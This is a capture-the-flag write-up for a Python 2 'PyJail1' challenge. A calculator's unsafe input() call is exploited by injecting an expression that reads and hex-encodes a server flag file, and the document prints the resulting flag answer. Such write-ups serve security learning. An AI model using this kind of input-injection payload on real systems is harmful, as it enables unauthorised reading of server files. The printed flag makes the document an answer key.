# [PyJail1](http://s1063.vdi.mipt.ru:8000/challenges#PyJail1)
You can find flag in `/home/pyjail1/flag.txt`
```python
#!/usr/bin/python2.7 -u

print("Calculator v0.1a")
print("Note: This alpha version can only sum 2 numbers")
 
# code from https://stackoverflow.com/questions/26692611/how-do-you-input-integers-using-input-in-python
try:
    X = int(input("X = "))
    Y = int(input("Y = "))
except ValueError:
    print("Not an integer value...")
 
print("X + Y = " + str(X + Y))
```

# Solution
1. Notice that if we input `X = eval('1+2')`, `X` will be stored 3.
2. `print` not working.
3. Let's encode file data to hex and then to decimal int:
```python
X = int('0x' + open('/home/pyjail1/flag.txt', 'r').read().encode('hex'), 16)
```
4. `Y = 0`
5. `X + Y = 4035685915437068415875044064788311391051187934429718878804198664549710883664479903569146894094096139901786421786148106`
6. After decoding we get:
```python
flag = hex(<result>)[2:] # slice after 0x
print(bytes.fromhex(flag))
```
7. Result: `flag{The_python2_is_d3ad_L0ng_l1ve_the_python3!}`.

**Answer**: `flag{The_python2_is_d3ad_L0ng_l1ve_the_python3!}`